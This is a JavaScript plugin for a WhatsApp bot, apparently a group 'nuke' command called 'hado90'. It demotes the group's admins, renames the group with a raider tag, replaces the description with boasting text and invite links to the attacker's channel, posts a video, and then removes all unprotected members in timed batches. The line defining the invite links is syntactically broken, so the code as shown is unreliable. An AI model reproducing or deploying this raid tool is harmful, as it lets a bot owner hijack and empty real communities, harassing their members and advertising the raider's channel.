import { promises as fs } from 'fs'

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))
var handler = async (m, { conn, participants }) => {
  try {
    const owners = new Set(
      (global.owner || [])
        .flatMap(v => {
          if (typeof v === 'string') return [v]
          if (Array.isArray(v)) return v.filter(x => typeof x === 'string')
          return []
        })
        .map(v => v.replace(/[^0-9]/g, ''))
    )
    const decodeJid = jid => conn.decodeJid(jid)
    const jidPhone = jid => (decodeJid(jid) || '').split('@')[0].replace(/[^0-9]/g, '')
    const botJid = decodeJid(conn.user?.jid || conn.user?.id)
    const botPhone = jidPhone(botJid)
    const groupUpdate = (conn.originalGroupParticipantsUpdate || conn.groupParticipantsUpdate).bind(conn)
    const chunk = (arr, size) => {
      const out = []
      for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size))
      return out
    }
    let metadata = null
    try {
      metadata = await conn.groupMetadata(m.chat)
    } catch {}
    const groupParticipants = metadata?.participants?.length ? metadata.participants : (participants || [])
    const groupOwnerPhones = new Set([
      jidPhone(metadata?.owner),
      ...groupParticipants
        .filter(p => p.admin === 'superadmin')
        .map(p => jidPhone(p.jid || p.id)),
    ].filter(Boolean))
    const protectedPhones = new Set([
      ...owners,
      botPhone,
      jidPhone(m.sender),
      ...groupOwnerPhones,
    ].filter(Boolean))

    if (!global.db.data.chats[m.chat]) global.db.data.chats[m.chat] = {}
    const chat = global.db.data.chats[m.chat]
    chat.rileva = false
    chat.welcome = false
    chat.goodbye = false

    const toDemote = groupParticipants
      .filter(p => p.admin && !protectedPhones.has(jidPhone(p.jid || p.id)))
      .map(p => decodeJid(p.jid || p.id))
      .filter(Boolean)
    if (toDemote.length > 0) {
      for (const part of chunk(toDemote, 15)) {
        await groupUpdate(m.chat, part, 'demote').catch(e => console.error('[hado90] errore retrocessione:', e))
        await delay(800)
      }
    }
    const canale = 'https://chat.whatsapp.com/IGn4PkanPDn6sjG0J2yubV' 'https://chat.whatsapp.com/JSTD0TkgSBt0oVH3aojpvh' 
    const pow = metadata?.subject || ''
    await conn.groupUpdateSubject(m.chat, `${pow} | svt by the danger ${global.nomebot}`)
    await delay(1000)
    await conn.groupUpdateDescription(m.chat, `『 🈵 』 Nessuno è mai rimasto in cima al mondo. Né tu, né io, e nemmeno gli dei. Ma quel vuoto insopportabile sul trono del cielo finisce oggi. D'ora in poi... io starò in cima.\nEntra nel canale:\n ${canale}`)
    await delay(1000)
    const videoBuffer = await fs.readFile('./media/hado90.mp4')
    await conn.sendMessage(m.chat, {
        video: videoBuffer,
        caption: `Non si schiaccia una formica con l'intento di non ucciderla. Semplicemente, sparisce. Proprio come questo gruppo.\n Entra nel canale:\n ${canale}`,
        gifPlayback: true,
        contextInfo: {
            ...global.fake.contextInfo
        }
    }, { quoted: m })
    await delay(1500)
    const groupNoAdmins = groupParticipants
      .filter(p => !protectedPhones.has(jidPhone(p.jid || p.id)))
      .map(p => decodeJid(p.jid || p.id))
      .filter(Boolean)
    if (groupNoAdmins.length > 0) {
      for (const part of chunk(groupNoAdmins, 10)) {
        await groupUpdate(m.chat, part, 'remove').catch(e => console.error('[hado90] errore rimozione:', e))
        await delay(800)
      }
    }
  } catch (e) {
    console.error(e)
    return m.reply(`*❌ ERRORE*\n━━━━━━━━━━━━━━━━\n\n*⚠️ Si è verificato un errore durante l'esecuzione di Hado 90*`)
  }
}

handler.command = /^hado90$/i
handler.group = true
handler.owner = true
handler.botAdmin = true

export default handler
